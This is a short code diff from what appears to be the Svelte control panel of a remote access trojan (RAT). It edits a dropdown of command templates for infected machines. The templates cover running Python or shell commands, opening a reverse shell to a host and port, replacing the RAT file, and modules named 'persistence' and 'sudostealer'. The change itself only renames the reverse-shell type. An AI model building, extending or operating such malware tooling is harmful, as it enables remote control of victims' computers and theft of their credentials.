@@ -102,7 +102,7 @@
     <select name="templates" id="templates" bind:value={code} onchange={() => {saved = false;}}>
       <option value={opt_fmt({type:"python", code:"print('Hello world')"})}>Python code</option>
       <option value={opt_fmt({type:"run", code:"gnome-calculator -m advanced"})}>Run command</option>
-      <option value={opt_fmt({type:"shell", host:"127.0.0.1", port:1234})}>Reverse shell</option>
+      <option value={opt_fmt({type:"tcpshell", host:"127.0.0.1", port:1234})}>Reverse shell</option>
       <option value={opt_fmt({type:"update", code:"REPLACE THE RAT FILE WITH THIS (DANGEROUS!!)"})}>Update RAT</option>
       <option value={opt_fmt({type:"get_specs", detailed:false})}>Update specs</option>
       {#each ["persistence", "sudostealer"] as name (name)}
